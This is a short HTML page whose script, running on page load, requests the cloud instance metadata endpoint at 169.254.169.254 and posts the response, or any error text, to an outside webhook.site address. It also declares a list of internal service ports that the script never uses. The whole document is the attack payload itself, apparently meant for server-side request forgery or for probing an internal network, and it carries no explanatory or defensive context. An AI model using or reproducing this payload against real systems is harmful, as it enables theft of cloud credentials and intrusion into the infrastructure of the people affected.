<!DOCTYPE html>
<html>
<body>
<script>
const ports = [80, 3000, 5000, 6379, 8000, 8080, 8443, 9200];
const webhook = 'https://55d4d9ea-c571-49f7-8993-5b34d000d460.webhook.site';

fetch('http://169.254.169.254/latest/meta-data/')
  .then(r => r.text())
  .then(data => fetch(`${webhook}/metadata`, {method:'POST', body: data}))
  .catch(e => fetch(`${webhook}/metadata-fail`, {method:'POST', body: e.toString()}));
</script>
